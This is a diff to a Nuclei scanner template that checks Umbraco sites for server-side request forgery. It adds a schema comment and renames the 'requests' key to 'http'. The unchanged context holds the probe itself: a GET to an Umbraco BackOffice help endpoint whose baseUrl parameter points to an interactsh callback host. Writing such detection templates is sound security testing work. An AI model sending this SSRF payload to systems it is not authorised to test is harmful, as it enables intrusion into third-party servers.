@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: umbraco-base-ssrf
 
 info:
@@ -16,7 +17,7 @@ info:
     shodan-query: http.html:"Umbraco"
   tags: ssrf,umbraco,oast
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
